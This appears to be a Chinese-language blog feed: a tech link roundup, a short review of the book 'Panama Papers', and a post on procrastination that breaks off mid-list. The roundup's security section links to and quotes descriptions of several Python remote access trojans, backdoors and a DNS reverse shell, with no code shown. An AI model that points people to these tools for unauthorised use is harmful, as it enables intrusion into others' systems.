&lt;li&gt;&lt;a href="https://medium.com/@zonble/our-mac-app-was-rejected-because-we-are-using-swift-3-9f574529945"&gt;Our Mac app was rejected because we are using Swift 3 – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Swift 3 寫 Mac App 會過不了官方 App store 的審核而不能上架，原因是使用了 Private API，但作者確定自己沒有使用任何 Private API，結果作者去追了 source code 以後發現，是 Swift 3 的 library 裏面用到的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@rudychin/ph-d-admission-uiuc-cornell-cmu-347827b5af00#.112b14qkm"&gt;[Ph.D. Admission] UIUC / Cornell / CMU – 金廷武 – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;人生勝利組的大學同學發了篇美國名校資工博士申請的心得文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django"&gt;Django Web Framework (Python) - Learn web development | MDN&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Mozilla 竟然有 Django 的 Tutorial XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;editor&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hungys.xyz/why-i-switched-from-sublime-to-vscode/"&gt;為什麼我從 Sublime Text 跳槽 Visual Studio Code？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;之前有試用過一下 VS code，覺得算是 GUI editor 裏面我目前用到覺得最好用的吧，光是內建整合 Git 以及 integrated terminal 對我來說就贏很多其他的 GUI editor 了。  &lt;/li&gt;
&lt;li&gt;看了這篇才知道原來 integrated terminal 的點子是台灣人去開 issue 的 XD。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gitlab&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://about.gitlab.com/2017/02/10/postmortem-of-database-outage-of-january-31/"&gt;Postmortem of database outage of January 31 | GitLab&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Gitlab 針對 2017/01/31 誤刪 production db 以及後續的處理和反省做了詳細的紀錄。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/google-cloud/using-single-docker-repository-with-multiple-gke-projects-1672689f780c"&gt;Using single Docker repository with multiple GKE projects&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;透過把另外一個 GCP project 的 GKE default service account 加入另外一個 GCP project 的 IAM 中，並給予相對應的權限，就能讓後者直接使用前者的 Docker repository，不用每開一個 GCP project 都要重新 build 一次。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lnishan.github.io/2017/interview-preparation-101/"&gt;Interview Preparation 101&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;成功面試進入美國 Google Intern 的人的準備心得  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;job&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.techug.com/post/first-two-years-i-work-in-huawei.html"&gt;一位在华为工作2年员工的心路历程 | 程序师&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;華為有這麼操喔？上次在飛機上跟一個華為的工程師聊感覺沒這麼慘耶，還是是因為這篇是上海，但跟我聊天的沒記錯好像是北京？而且他才第1年就四處出差都公司出錢。還是學碩士差別？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;keyboard&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hackaday.com/2016/09/04/convert-any-usb-keyboard-to-bluetooth/"&gt;Convert Any USB Keyboard to Bluetooth | Hackaday&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好酷啊，竟然可以自幹個把 USB 轉成 Bluetooth 的裝置，不過去看了教學影片以後其實還挺麻煩的就是了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/learning-new-stuff/machine-learning-in-a-year-cdb0b0ebd29c"&gt;Machine Learning in a Year – Learning New Stuff – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者花了一年的時間自學 Machine Learning。開頭就說不一定需要懂數學理論才能開始學。  &lt;/li&gt;
&lt;li&gt;簡體中文版：&lt;a href="http://www.techug.com/post/how-i-learn-machine-learning-in-a-year.html"&gt;我是如何花了一年時間來學機器學習的 | 程序師&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/terryum/awesome-deep-learning-papers"&gt;terryum/awesome-deep-learning-papers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個收集跟 Deep Learning 相關論文的 Repo.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.wired.com/2017/02/programming-is-the-new-blue-collar-job/"&gt;The Next Big Blue-Collar Job Is Coding | WIRED&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;When I ask people to picture a coder, they usually imagine someone like Mark Zuckerberg: a hoodied college dropout who builds an app in a feverish 72-hour programming jag—with the goal of getting insanely rich and, as they say, “changing the world.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;寫程式的門檻愈降愈低，很多時候不用懂相關理論甚至只要複製貼上再修修改改就能夠寫出一個應用程式，等到人人都會寫程式，像現在勞力付出的藍領階級工作一樣普及的時候，那些純勞力付出的工作可能都已經被機器取代。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/python/cpython"&gt;python/cpython: The Python programming language&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;CPython 的 source code 丟到 GitHub 上哩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/playpauseandstop/python-3-dot-6-and-performance-a-love-story"&gt;Python 3.6 &amp;amp; Performance. A Love Story&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;關於 Python 3.6 一些新特性的介紹，紀錄一些比較顯著的：  &lt;ul&gt;
&lt;li&gt;PEP 498: f-strings  &lt;/li&gt;
&lt;li&gt;PEP 525: Async generator  &lt;/li&gt;
&lt;li&gt;PEP 530: Async comprehension  &lt;/li&gt;
&lt;li&gt;PEP 526: Variable annotations  &lt;/li&gt;
&lt;li&gt;new &lt;code&gt;dict&lt;/code&gt; implementation  &lt;ul&gt;
&lt;li&gt;參考了 PyPy 的實作，為 dict 的 memory entry 加上 index  &lt;/li&gt;
&lt;li&gt;memory usage 20% ~ 25% smaller comparted to Python 3.5  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;以及比較了執行速度： Python 2.7 &amp;gt; Python 3.6 &amp;gt; Python 3.5，而 Python 3.7 會比 Python 3.6 再快些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/keitheis/alog"&gt;keitheis/alog: Python logging for Humans.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Python logging for Humans. Your goto logging module without panic on context swtich.  Warning: No more logger = logging.getLogger(&lt;strong&gt;name&lt;/strong&gt;) in your every file.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;resume&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nickwarm.logdown.com/posts/1402232"&gt;撰寫履歷：如何吸引賞識你的人 « NickWarm's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是以中文履歷為主  &lt;/li&gt;
&lt;li&gt;同一個人丟了兩種不同版本的履歷，一個收到感謝函，一個收到面試通知，足見履歷重要性。  &lt;/li&gt;
&lt;li&gt;除了照片、姓名解構、自傳以外我都算認同  &lt;/li&gt;
&lt;li&gt;CakeResume 感覺不錯用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;p&gt;看了第一個 RAT 的工具以後，就把其他相關的也看了一下了。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/nathanlopez/Stitch"&gt;nathanlopez/Stitch: Python Remote Administration Tool (RAT)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Stitch is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sweetsoftware/Ares"&gt;sweetsoftware/Ares: Python botnet and backdoor&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Ares is a Python Remote Access Tool.  Warning: Only use this software according to your current legislation. Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ahhh/Reverse_DNS_Shell"&gt;GitHub - ahhh/Reverse_DNS_Shell: A python reverse shell that uses DNS as the c2 channel&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;DNShell v1.7 Description: A Python Reverse Shell that uses DNS as the C2 channel. Requires: dnslib dnspython pycrypto Gotchyas: don't forget to change your HOST don't forget to change your SECRET key run server first Moar Info: &lt;a href="http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell"&gt;http://lockboxx.blogspot.com/2015/01/python-reverse-dns-shell&lt;/a&gt;.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vesche/basicRAT"&gt;vesche/basicRAT: python remote access trojan&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This is a Python RAT (Remote Access Trojan), basicRAT was created to maintain a clean design full-featured Python RAT. Currently a work in progress and still being hacked on.  Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/n1nj4sec/pupy"&gt;GitHub - n1nj4sec/pupy: Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Pupy is an opensource, multi-platform (Windows, Linux, OSX, Android), multi function RAT (Remote Administration Tool) and post-exploitation tool mainly written in python. It features a all-in-memory execution guideline and leaves very low footprint.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;software engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://arxiv.org/abs/1702.01715"&gt;[1702.01715] Software Engineering at Google&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1702.01715.pdf"&gt;1702.01715.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.bbc.com/zhongwen/trad/38859981"&gt;你知道英語可以寫成這樣嗎？ - BBC 中文網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來英文有速記寫法，根本就是蝌蚪文 XD。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://disp.cc/b/163-9SEx"&gt;Re: [問卦] 那些說吻仔魚是各種魚類幼苗的人在想什麼 - Gossiping板 - Disp BBS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;吻仔魚是沙丁魚魚苗，不好養殖，只能用補抓野生的，因為魚苗很小，所以要用網眼特別小的魚網，捕撈時會連同其他魚的魚苗也一起抓上來，也不可能每個魚苗慢慢挑，進而導致漁業資源枯竭。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ds3d2x8n3szkj73oe8n0.lh.pdis.nat.gov.tw/"&gt;2016/10 立院公聽會 | 電競政策產銷履歷 | hackfoldr&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來電競替代役從去年 10 月就開始計劃了啊  &lt;/li&gt;
&lt;li&gt;而且 hackfolder 竟然被引進政府裏面用了嗎？  &lt;/li&gt;
&lt;li&gt;真的是完全公開透明的會議記錄啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.storm.mg/lifestyle/220782"&gt;不考幹嘛念？偏鄉免費教程式多年，成大教授：4個錯觀念，害台灣一代比一代笨-教育｜台灣｜偏鄉教育｜教授｜學習｜做孩子的重要他人｜蘇文鈺｜成大資工系｜程式教育-風傳媒-蘇文鈺&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只學「有用」的學問  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;不唸不會賺錢的科系  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不培養無法測量的能力  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;考試至上，什麼都要打分數。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;製造相互排擠的世代  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;成績好的人不肯教成績不好的人，怕自己被超越。  &lt;/li&gt;
&lt;li&gt;芬蘭的教育則是從小就讓孩子學會互助合作。  &lt;/li&gt;
&lt;li&gt;成功是靠互助合作，而不是踩著別人的屍骨往上爬。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;教育不該為教育以外的目的服務  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;很多企業開的私立大學都是為了直接培養員工，不太教其他的事。  &lt;/li&gt;
&lt;li&gt;反而很多台灣家長覺得這樣很棒，一畢業就有工作。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Gosu"&gt;Gosu - Wikipedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Gosu (고수) is a Korean term used to refer to a highly skilled person. In computer gaming the term is usually used to refer to a person highly skilled in multiplayer games like StarCraft, Warcraft III (RTS/RPG - DotA), Diablo II (RPG), Counter-Strike (FPS) and others.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;原來 Gosu 在韓文是高手的意思...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="app"></category><category term="blog"></category><category term="django"></category><category term="editor"></category><category term="gitlab"></category><category term="gke"></category><category term="interview"></category><category term="job"></category><category term="keyboard"></category><category term="machine learning"></category><category term="misc"></category><category term="programmer"></category><category term="pupy"></category><category term="python"></category><category term="resume"></category><category term="security"></category><category term="software engineering"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>《巴拿馬文件》</title><link href="https://blog.m157q.tw/posts/2017/02/09/panama-papers/" rel="alternate"></link><published>2017-02-09T05:33:53+08:00</published><updated>2017-02-09T05:33:53+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-02-09:posts/2017/02/09/panama-papers/</id><summary type="html">&lt;p&gt;&lt;img alt="front cover" src="/files/panama-papers/front-cover.jpg" /&gt;&lt;br /&gt;
&lt;img alt="back cover" src="/files/panama-papers/back-cover.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;失眠爬起來看書，&lt;br /&gt;
終於看完《巴拿馬文件》，&lt;br /&gt;
距離 20160403 公布也快一年了。  &lt;/p&gt;
&lt;p&gt;最後一章與後記很精彩，&lt;br /&gt;
講述巴拿馬文件公布後發生了哪些事。  &lt;/p&gt;
&lt;p&gt;前面三十章則是各種國家元首、總理、名人及其親信與境外公司、信箱公司、避稅地等關於為期一年調查期間錯綜複雜的詳細描述。  &lt;/p&gt;
&lt;p&gt;爆料者的公開聲明也很值得一看。  &lt;/p&gt;
&lt;p&gt;說起來這本繁中翻譯版是 20160519 初版，&lt;br /&gt;
距離公佈大概一個半月左右，&lt;br /&gt;
但書中收錄了匿名爆料者於 20160506 的聲明，&lt;br /&gt;
也就是說少於兩個禮拜內就翻譯完了？  &lt;/p&gt;
&lt;p&gt;看完之後真的覺得如果沒有這樣的爆料，&lt;br /&gt;
根本無法想像這些超級富豪的世界，&lt;br /&gt;
也才瞭解到財富的分配究竟是有多麼的不平均。  &lt;/p&gt;</summary><category term="Panama Papers"></category></entry><entry><title>努力杜絕拖延症</title><link href="https://blog.m157q.tw/posts/2017/02/06/try-to-get-rid-of-procrastination/" rel="alternate"></link><published>2017-02-09T14:59:07+08:00</published><updated>2017-02-09T14:59:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-02-06:posts/2017/02/06/try-to-get-rid-of-procrastination/</id><summary type="html">&lt;h2&gt;聲明&lt;/h2&gt;
&lt;p&gt;這篇文章個人覺得一定要是拖延症患者來看才會覺得合理，&lt;br /&gt;
如果不是拖延症患者的話絕對不適用，&lt;br /&gt;
因為會覺得非常荒謬。  &lt;/p&gt;
&lt;p&gt;其實這篇比較像是我的超我在對我的本我說的話，&lt;br /&gt;
所以不一定適用在其他人身上，&lt;br /&gt;
但非常歡迎討論，&lt;br /&gt;
如果有人有方法的話拜託跟我說一下，&lt;br /&gt;
真的好想杜絕拖延症啊！  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;先擺脫完美主義  &lt;ul&gt;
&lt;li&gt;如果你不是完美主義者，恭喜你，可以跳到下一項。  &lt;/li&gt;
&lt;li&gt;必須認知到一件事情要做到完美，勢必得花上更多的時間，進而壓縮到做其他事的時間，然後就開始拖延。  &lt;/li&gt;
&lt;li&gt;評估這件事值得做到多完美，如果不是的話，做到普通程度好就好，不用多完美沒關係，一定要讓自己能夠接受這件事，因為大多數的事情其實都不值得做到完美。  &lt;/li&gt;
&lt;li&gt;學著接受不完美（或者換句話說，學會取捨，不要什麼都想要）  &lt;ul&gt;
&lt;li&gt;閱讀一本書不用全部的字都得細看過，第一次閱讀的時候略讀就好，快速看完之後開始回想，記不清楚的地方再回去翻閱即可。否則閱讀書籍的時間會拉太長，進而覺得閱讀書籍這件事沒有成就感，就愈發不想去做這件事，從此進入拖延症的惡性循環。  &lt;/li&gt;
&lt;li&gt;寫一篇文章或筆記不要想全部都要紀錄下來，即便清楚得知道自己日後一定會忘記一些細節。  &lt;ul&gt;
&lt;li&gt;停止寫流水帳，紀錄重點就好。  &lt;/li&gt;
&lt;li&gt;我知道日後看到充滿細節的流水帳時，因為紀錄到腦中已經忘掉的細節的那種成就感非常爽沒錯，但寫一篇充滿細節的流水帳要花費的時間比重點式的紀錄實在多太多的時間了，這只會讓你覺得寫文章或筆記紀錄這些事情很累，之後遇到想要紀錄的事情時會很難提起勁去做，於是又拖延了，還可能錯失了紀錄一些值得紀錄的事情的機會。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看新聞或 RSS Feed 時，沒必要每一篇都要看的很仔細，有些就是知道就好，真的有興趣的再細看，但也不是很仔細的慢慢看那種，那樣太浪費時間了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要為自己訂太多目標  &lt;ul&gt;
&lt;li&gt;看到一長串目標清單只會徒增壓力，讓自己更提不起勁去做這些事情，於是愈拖愈久。  &lt;/li&gt;
&lt;li&gt;情況嚴重的患者甚至最好不要為自己訂目標  &lt;ul&gt;
&lt;li&gt;因為此類情況嚴重的人通常也都是嚴重的完美主義者，對自己的標準都會比普通人對自己來的高，所以一般情況下不設定什麼目標去做的事情，品質往往也會比一般人來的好，沒必要為自己徒增壓力。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要一直想接下來要幹嘛，因為你絕對不會去做。  &lt;ul&gt;
&lt;li&gt;有過太多次這種經驗了，每次都覺得自己現在狀態很好，接下來可以一口氣把某些事情做完，結果一講出來以後，突然就脫離了那個狀態，變得什麼事也不想做，即便是前幾分鐘才說出口的事，甚至要完成該件事的難度也通常不高。  &lt;/li&gt;
&lt;li&gt;只要想到下一步便可去做，下下一步的事等做完下一步再來想就好。一直想下去的話，到最後只會覺得這件事非常麻煩，然後就不想去做了，於是就一直拖延。  &lt;ul&gt;
&lt;li&gt;很多這類的事情其實完成第一步以後就非常簡單  &lt;/li&gt;
&lt;li&gt;重點在於自己給自己設定了一個自己都沒辦法克服的的最大靜摩擦力  &lt;/li&gt;
&lt;li&gt;導致往往踏不出第一步，所以事情永遠無法完成。  &lt;/li&gt;
&lt;li&gt;我想很多拖延症患者應該都有過這種經驗，一件事情拖了非常久，拖到最後的死線才去做，結果發現根本沒想像中的難。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;珍惜自己專注於一件事情很長一段時間的狀態  &lt;ul&gt;
&lt;li&gt;在這件事情沒有完成前，千萬不要讓自己或別人隨意把這個狀態打斷，因為被打斷後，有極大的可能性不會想再去做這件事，或者甚至不小心就把這件事給忘了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;想到的事情如果能做的話馬上去做  &lt;ul&gt;
&lt;li&gt;很多時間管理的書會要你根據時間急迫性與重要性 2 個向度來劃分成 4 個象限，要你根據這個來決定現在優先做什麼事。  &lt;/li&gt;
&lt;li&gt;但對於拖延症患者來說，光是要判斷這件事情的急迫性與重要性的時候就會考慮一堆條件，導致光是要決定事情處理的優先順序就會花費大量的時間，甚至根本無法決定，還很有可能突然進入一種極度煩躁的狀態，然後就突然什麼事情都不想做了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把握心血來潮或者三分鐘熱度的衝勁  &lt;ul&gt;
&lt;li&gt;如果是重要的事情的話更要把握這部份，因為如果順利的話，很容易就可以進入極度專注的狀況，然後便能很快把事情完成。  &lt;/li&gt;
&lt;li&gt;而且通常這種突然很想做某件事情的念頭很快就會消失，如果這件事情很重要但又不趕快去做的話，之後很可能會時不時出現在腦海裡，但從它在你腦海出現第二次開始，你就會開始覺得煩躁而不想去做這件事。  &lt;/li&gt;
&lt;li&gt;如果是某種沒辦法馬上執行的想法的話，可以用自己習慣的方式趕快把想到的東西紀錄下來，無論是用寫下來的或是用打字紀錄，自己覺得習慣的方法都好。這樣一來，就算當下沒有真的去做，寫下來的想法可以在之後突然又想要做這件事情時的最大靜摩擦力降低。  &lt;ul&gt;
&lt;li&gt;至於這部份要紀錄的多詳細，就看這個想法有多複雜，如果不複雜的話就紀錄的詳細一點，如果太複雜的話，就挑重點紀錄。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嗯，像這篇文章就是個把握心血來潮的產物  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要一件事情還沒做完就跑去做另一件事  &lt;ul&gt;
&lt;li&gt;因為會一直不斷的發散下去，最後回來做自己本來應該要做的事情時才發現已經浪費了非常多的時間，然後又得花一段時間讓自己回到狀態。  &lt;ul&gt;
&lt;li&gt;嚴重的話甚至會忘記自己原本要做什麼事  &lt;/li&gt;
&lt;li&gt;這種狀況非常容易伴隨出現在社群網站成癮者，一件事情還沒做完就開始看社群網站上的訊息，這點一定要克制自己。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得一件事情拖太久或是太難做到的話，必須有技巧的將其步驟化。  &lt;ul&gt;
&lt;li&gt;步驟化的優先程度以降低難度為主，其次是步驟數目愈少愈好。  &lt;/li&gt;
&lt;li&gt;不用等到把全部的步驟想完才去做，除非每個步驟真的都很簡單到不會有壓力感，但通常不太可能。  &lt;/li&gt;
&lt;li&gt;降低難度就是在降低做這件事的最大靜摩擦力，當最大靜摩擦力降低到自己可負荷的程度時，很自然的就會去做這件事了。  &lt;/li&gt;
&lt;li&gt;至於步驟愈少愈好則是避免自己又想太多的步驟，導致又開始覺得這件事情太難而無法達成。  &lt;/li&gt;
&lt;li&gt;有些書會推薦為自己每個階段訂下獎勵，例如完成某個步驟之後就可以玩一個小時、吃什麼東西等等  &lt;ul&gt;
&lt;li&gt;但坦白說這方法對我完全無效，因為只要這件事情讓我覺得最大靜摩擦力太大的話，這些獎勵基本上都沒啥用。  &lt;/li&gt;
&lt;li&gt;當然，當獎勵不是自己給自己的時候會有差別，最常見的當然就是「給你多少錢，你幫我完成這件事。」  &lt;/li&gt;
&lt;li&gt;當獎勵是自己給自己的時候，對拖延症患者來說根本沒啥用，因為我只會多想「啊獎勵還不是我自己給自己的，幹嘛這麼麻煩？」，然後就不想做這件事了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;先這樣吧，&lt;br /&gt;
有想到其他的或試過以後真的有用的方法再補上來。&lt;br /&gt;
喔，然後個人覺得 "Release Early, Release Often." 對拖延症患者來說挺有用的。&lt;br /&gt;
例如：一開始先不要想別人到底會怎麼想，自己先覺得爽就好，等到之後如果真的有需要考慮別人的意見的時候再來做修改。因為一直考慮別人的想法只會讓自己徒增壓力，然後反覆修改調整卻一直沒把事情做完，到最後又會覺得很煩而不想做了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=yNKsjR5Ay2U"&gt;為什麼我老是愛拖延(上)? | 啾來聊聊2015 第13集 | 啾啾鞋 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;推力型動機 vs 拉力型動機  &lt;ul&gt;
&lt;li&gt;推力型：沒完成這件事，就會怎樣。  &lt;/li&gt;
&lt;li&gt;拉力型：完成這件事，就會怎樣。  &lt;/li&gt;
&lt;li&gt;我們需要的是給自己拉力型的動機，而不是推力型的動機。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非適應型完美主義  &lt;ul&gt;
&lt;li&gt;常常預先設想要把事情做的多好，但最後卻都沒有能力達成。  &lt;/li&gt;
&lt;li&gt;與團隊合作時的效率會非常高，但自己一個人的時候就什麼事都不想做。  &lt;/li&gt;
&lt;li&gt;「要嘛就做到最好，要嘛就不要做」，這種心態導致了拖延。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;害怕自己不成功  &lt;ul&gt;
&lt;li&gt;害怕自己用了 100% 的實力去做了這件事以後，但結果卻不如預期。如果是拖延了好一陣子才開始做的話，如果結果不如預期時，就可以拿因為拖了很久才做當成藉口，進而不去面對可能是自己實力不足的這件事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;想要有主控權  &lt;ul&gt;
&lt;li&gt;把事情拖到最後一刻才做，顯的自己好像主宰這件事，因為別人都得因為自己而受到影響。  &lt;ul&gt;
&lt;li&gt;例如：帳單拖到最後一天才要繳錢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原本打算去做某件事，但在還沒做之前突然被別人講說自己應該去做該件事，為了表示自己沒必要聽從他人的話，就臨時決定不做該件事了。  &lt;ul&gt;
